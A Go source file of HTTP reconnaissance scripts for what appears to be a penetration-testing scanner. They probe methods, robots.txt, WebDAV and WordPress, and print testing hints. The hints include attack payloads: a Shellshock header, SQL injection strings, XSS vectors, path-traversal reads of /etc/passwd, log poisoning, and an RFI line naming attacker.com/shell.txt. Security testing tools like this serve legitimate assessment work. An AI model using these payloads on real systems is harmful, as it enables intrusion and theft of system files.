package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// HTTPMethodsScript checks allowed HTTP methods
type HTTPMethodsScript struct{}

func (s *HTTPMethodsScript) Name() string        { return "http-methods" }
func (s *HTTPMethodsScript) Description() string { return "Checks allowed HTTP methods" }
func (s *HTTPMethodsScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryDiscovery, CategoryDefault, CategorySafe}
}
func (s *HTTPMethodsScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPMethodsScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	url := fmt.Sprintf("http://%s:%d/", target.Host, target.Port)
	if target.Port == 443 || target.Port == 8443 {
		url = fmt.Sprintf("https://%s:%d/", target.Host, target.Port)
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, _ := http.NewRequest("OPTIONS", url, nil)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	result := &ScriptResult{ScriptName: s.Name()}
	allow := resp.Header.Get("Allow")
	
	if allow != "" {
		result.Output = fmt.Sprintf("Allowed HTTP Methods: %s", allow)
		result.Findings = append(result.Findings, allow)
		
		// Check for dangerous methods
		dangerous := []string{"PUT", "DELETE", "TRACE", "CONNECT"}
		for _, method := range dangerous {
			if strings.Contains(allow, method) {
				result.Findings = append(result.Findings, fmt.Sprintf("[!] Dangerous method enabled: %s", method))
				result.Vulnerable = true
			}
		}
	} else {
		result.Output = "Could not determine allowed methods"
	}

	return result, nil
}

// HTTPRobotsScript retrieves robots.txt
type HTTPRobotsScript struct{}

func (s *HTTPRobotsScript) Name() string        { return "http-robots-txt" }
func (s *HTTPRobotsScript) Description() string { return "Retrieves and analyzes robots.txt" }
func (s *HTTPRobotsScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryDiscovery, CategoryDefault, CategorySafe}
}
func (s *HTTPRobotsScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPRobotsScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	url := fmt.Sprintf("http://%s:%d/robots.txt", target.Host, target.Port)
	if target.Port == 443 || target.Port == 8443 {
		url = fmt.Sprintf("https://%s:%d/robots.txt", target.Host, target.Port)
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	result := &ScriptResult{ScriptName: s.Name()}

	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		robotsTxt := string(body)
		
		if len(robotsTxt) > 0 {
			result.Output = fmt.Sprintf("robots.txt found:\n%s", robotsTxt[:minInt(len(robotsTxt), 500)])
			
			// Look for interesting paths
			lines := strings.Split(robotsTxt, "\n")
			for _, line := range lines {
				if strings.HasPrefix(strings.ToLower(line), "disallow:") {
					path := strings.TrimSpace(strings.TrimPrefix(line, "Disallow:"))
					if path != "" && path != "/" {
						result.Findings = append(result.Findings, fmt.Sprintf("Hidden path: %s", path))
					}
				}
			}
		}
	} else {
		result.Output = "No robots.txt found"
	}

	return result, nil
}

// HTTPEnumScript performs directory/file enumeration hints
type HTTPEnumScript struct{}

func (s *HTTPEnumScript) Name() string        { return "http-enum" }
func (s *HTTPEnumScript) Description() string { return "Suggests HTTP enumeration techniques" }
func (s *HTTPEnumScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryDiscovery, CategorySafe}
}
func (s *HTTPEnumScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPEnumScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	result := &ScriptResult{ScriptName: s.Name()}
	
	commonPaths := []string{
		"/admin", "/login", "/administrator", "/phpmyadmin",
		"/uploads", "/upload", "/files", "/backup", "/backups",
		"/dev", "/test", "/tmp", "/temp", "/api", "/console",
		"/.git", "/.svn", "/.env", "/config", "/wp-admin",
	}
	
	result.Output = fmt.Sprintf("HTTP Enumeration Suggestions:\n\nCommon paths to check:\n%s\n\nTools to use:\n- gobuster dir -u http://%s:%d -w /usr/share/wordlists/dirb/common.txt\n- feroxbuster -u http://%s:%d\n- nikto -h http://%s:%d\n- wfuzz -w wordlist.txt http://%s:%d/FUZZ",
		strings.Join(commonPaths, "\n"),
		target.Host, target.Port,
		target.Host, target.Port,
		target.Host, target.Port,
		target.Host, target.Port)
	
	result.Findings = append(result.Findings, "Directory enumeration recommended")
	
	return result, nil
}

// HTTPWebDAVScript checks for WebDAV
type HTTPWebDAVScript struct{}

func (s *HTTPWebDAVScript) Name() string        { return "http-webdav-scan" }
func (s *HTTPWebDAVScript) Description() string { return "Checks for WebDAV and tests methods" }
func (s *HTTPWebDAVScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryVuln, CategoryDiscovery, CategorySafe}
}
func (s *HTTPWebDAVScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPWebDAVScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	url := fmt.Sprintf("http://%s:%d/", target.Host, target.Port)
	if target.Port == 443 {
		url = fmt.Sprintf("https://%s:%d/", target.Host, target.Port)
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Check for WebDAV using PROPFIND
	req, _ := http.NewRequest("PROPFIND", url, nil)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	result := &ScriptResult{ScriptName: s.Name()}

	if resp.StatusCode == 207 || resp.StatusCode == 405 {
		result.Output = "WebDAV may be enabled\nNote: Use davtest or cadaver for testing\nExample: davtest -url http://<target>/webdav\nExample: cadaver http://<target>/webdav"
		result.Findings = append(result.Findings, "WebDAV enabled - test for file upload")
		result.Vulnerable = true
	} else {
		result.Output = "WebDAV not detected"
	}

	return result, nil
}

// HTTPBackupFilesScript checks for backup files
type HTTPBackupFilesScript struct{}

func (s *HTTPBackupFilesScript) Name() string        { return "http-backup-finder" }
func (s *HTTPBackupFilesScript) Description() string { return "Checks for common backup file patterns" }
func (s *HTTPBackupFilesScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryDiscovery, CategorySafe}
}
func (s *HTTPBackupFilesScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPBackupFilesScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	result := &ScriptResult{ScriptName: s.Name()}
	
	backupPatterns := []string{
		"index.php~", "index.php.bak", "index.php.old", "index.php.backup",
		"config.php.bak", "backup.sql", "backup.zip", "backup.tar.gz",
		"db_backup.sql", "site.zip", "www.zip", "backup.rar",
	}
	
	result.Output = fmt.Sprintf("Common backup file patterns to check:\n%s\n\nExample: curl http://%s:%d/config.php.bak",
		strings.Join(backupPatterns, "\n"),
		target.Host, target.Port)
	
	result.Findings = append(result.Findings, "Check for backup files")
	
	return result, nil
}

// HTTPCGIScript checks for CGI vulnerabilities
type HTTPCGIScript struct{}

func (s *HTTPCGIScript) Name() string        { return "http-shellshock" }
func (s *HTTPCGIScript) Description() string { return "Checks for Shellshock (CVE-2014-6271) vulnerability" }
func (s *HTTPCGIScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryVuln, CategorySafe}
}
func (s *HTTPCGIScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPCGIScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	result := &ScriptResult{ScriptName: s.Name()}
	
	result.Output = "Shellshock Check:\nNote: Affects servers with CGI scripts using vulnerable Bash\nCommon CGI paths: /cgi-bin/, /cgi-sys/, /cgi-mod/\nTest with: curl -H \"User-Agent: () { :; }; echo vulnerable\" http://<target>/cgi-bin/test.cgi\nMetasploit: exploit/multi/http/apache_mod_cgi_bash_env_exec"
	result.Findings = append(result.Findings, "Check for Shellshock if CGI present")
	
	return result, nil
}

// HTTPSQLMapScript provides SQLi testing guidance
type HTTPSQLMapScript struct{}

func (s *HTTPSQLMapScript) Name() string        { return "http-sql-injection" }
func (s *HTTPSQLMapScript) Description() string { return "Provides SQL injection testing guidance" }
func (s *HTTPSQLMapScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryVuln, CategorySafe}
}
func (s *HTTPSQLMapScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPSQLMapScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	result := &ScriptResult{ScriptName: s.Name()}
	
	result.Output = "SQL Injection Testing:\nManual tests: ', \", --;, ' OR '1'='1, ' OR 1=1--\nTools:\n- sqlmap -u \"http://<target>/page.php?id=1\" --batch\n- sqlmap -r request.txt --batch --level=5 --risk=3\nLook for: Error messages, time delays, boolean-based blind SQLi"
	result.Findings = append(result.Findings, "Test for SQL injection")
	
	return result, nil
}

// HTTPXSSScript provides XSS testing guidance
type HTTPXSSScript struct{}

func (s *HTTPXSSScript) Name() string        { return "http-xss" }
func (s *HTTPXSSScript) Description() string { return "Provides XSS testing guidance" }
func (s *HTTPXSSScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryVuln, CategorySafe}
}
func (s *HTTPXSSScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPXSSScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	result := &ScriptResult{ScriptName: s.Name()}
	
	result.Output = "XSS Testing:\nReflected: <script>alert(1)</script>\nStored: Test input forms and comment sections\nDOM-based: Check JavaScript handling of URL parameters\nTools: xsser, dalfox\nBypasses: <img src=x onerror=alert(1)>, <svg onload=alert(1)>"
	result.Findings = append(result.Findings, "Test for XSS vulnerabilities")
	
	return result, nil
}

// HTTPLFIScript provides LFI testing guidance
type HTTPLFIScript struct{}

func (s *HTTPLFIScript) Name() string        { return "http-lfi" }
func (s *HTTPLFIScript) Description() string { return "Provides Local File Inclusion testing guidance" }
func (s *HTTPLFIScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryVuln, CategorySafe}
}
func (s *HTTPLFIScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPLFIScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	result := &ScriptResult{ScriptName: s.Name()}
	
	result.Output = `LFI/RFI Testing:
Payloads:
- ../../../etc/passwd
- ....//....//....//etc/passwd
- ..%2f..%2f..%2fetc%2fpasswd
- /etc/passwd (if absolute path works)
- php://filter/convert.base64-encode/resource=index.php

Windows:
- ..\..\..\windows\system32\drivers\etc\hosts
- C:\windows\system32\drivers\etc\hosts

Log poisoning:
- /var/log/apache2/access.log (inject PHP in User-Agent)
- /var/log/mail (poison via SMTP)

RFI: http://attacker.com/shell.txt`
	
	result.Findings = append(result.Findings, "Test for LFI/RFI vulnerabilities")
	
	return result, nil
}

// HTTPWordPressScript checks for WordPress
type HTTPWordPressScript struct{}

func (s *HTTPWordPressScript) Name() string        { return "http-wordpress-enum" }
func (s *HTTPWordPressScript) Description() string { return "WordPress detection and enumeration" }
func (s *HTTPWordPressScript) Categories() []ScriptCategory {
	return []ScriptCategory{CategoryDiscovery, CategorySafe}
}
func (s *HTTPWordPressScript) PortRule(port int, service string) bool {
	return isHTTPService(port, service)
}

func (s *HTTPWordPressScript) Execute(target ScriptTarget) (*ScriptResult, error) {
	url := fmt.Sprintf("http://%s:%d/wp-admin", target.Host, target.Port)
	if target.Port == 443 {
		url = fmt.Sprintf("https://%s:%d/wp-admin", target.Host, target.Port)
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	result := &ScriptResult{ScriptName: s.Name()}

	if resp.StatusCode == 200 || resp.StatusCode == 302 {
		result.Output = fmt.Sprintf("WordPress detected!\nEnumeration:\n- wpscan --url http://%s:%d --enumerate p,t,u\n- /wp-json/wp/v2/users (REST API user enum)\nCommon paths: /wp-content/uploads/, /wp-includes/", target.Host, target.Port)
		result.Findings = append(result.Findings, "WordPress installation found")
	} else {
		result.Output = "WordPress not detected"
	}

	return result, nil
}
